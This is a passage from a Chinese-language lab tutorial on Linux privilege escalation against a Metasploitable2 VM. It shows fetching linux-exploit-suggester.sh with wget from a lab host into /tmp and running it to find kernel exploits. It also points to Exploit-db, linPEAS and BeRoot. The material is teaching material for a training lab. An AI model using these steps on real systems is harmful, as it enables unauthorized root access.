<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget 192.168.122.1:8000/linux-exploit-suggester.sh <span class="nt">-P</span> /tmp
</code></pre></div></div>

<p><img src="..\images\2021-01-23_130.jpg" alt="图片描述" /></p>

<p>添加执行权限并执行脚本：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
</code></pre></div></div>

<p>不幸的是，提示 bash 版本过低不支持运行该脚本：</p>

<p><img src="..\images\2021-01-23_131.jpg" alt="图片描述" /></p>

<p>大多数时候是可以直接运行的，但是如果偶尔遇到这种情况，可以采用手动录入内核信息的方式。</p>

<p>在 Metasploitable2 上运行<code class="language-plaintext highlighter-rouge">uname -a</code>查询主机信息，并将输出结果复制下来：</p>

<p><img src="..\images\2021-01-23_132.jpg" alt="图片描述" /></p>

<p>然后回到云主机上运行<code class="language-plaintext highlighter-rouge">./linux-exploit-suggester.sh</code>脚本：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-u</code> : 指定<code class="language-plaintext highlighter-rouge">uname -a</code> 获取的信息</li>
  <li><code class="language-plaintext highlighter-rouge">--kernelspace-only</code> : 仅显示内核漏洞</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./linux-exploit-suggester.sh <span class="nt">-u</span> <span class="s2">"Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux"</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_133.jpg" alt="图片描述" /></p>

<p>下图是我们得到的分析结果：</p>

<p><img src="..\images\2021-01-23_134.jpg" alt="图片描述" /></p>

<p>每一条漏洞都包含 Exposure （影响概率）和 Download URL（ EXP 下载链接），其中 Exposure 分级如下：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Highly probable</code> - 被评估的内核很有可能受到影响，而且很有可能 PoC 漏洞不需要任何重大修改就能正常运行。</li>
  <li><code class="language-plaintext highlighter-rouge">Probable</code> - 有可能会成功，但很有可能需要定制 EXP 漏洞来适应你的目标。</li>
  <li><code class="language-plaintext highlighter-rouge">Less probable</code> - 需要额外的手动分析来验证内核是否受到影响。</li>
  <li><code class="language-plaintext highlighter-rouge">Unprobable</code> - 内核受影响的可能性极低。</li>
</ul>

<p>一般只用尝试<code class="language-plaintext highlighter-rouge">Highly probable</code>和<code class="language-plaintext highlighter-rouge">robable</code>定级的<code class="language-plaintext highlighter-rouge">EXP</code>即可。</p>

<p>但需要注意的是，<code class="language-plaintext highlighter-rouge">linux-exploit-suggester</code> 的结果并不一定非常准确，如果结果中的 CVE 均无法利用，你仍然需要手动去 <code class="language-plaintext highlighter-rouge">[Exploit-db.com](http://exploit-db.com)</code> 搜索内核漏洞再来尝试。</p>

<p>在本节实验中，我们学习了 LinEnum 和 linux-exploit-suggester 提权辅助脚本工具的使用方法，其实辅助工具还有很多，例如以下两个：</p>

<ul>
  <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a></li>
  <li><a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">BeRoot</a></li>
</ul>

:ET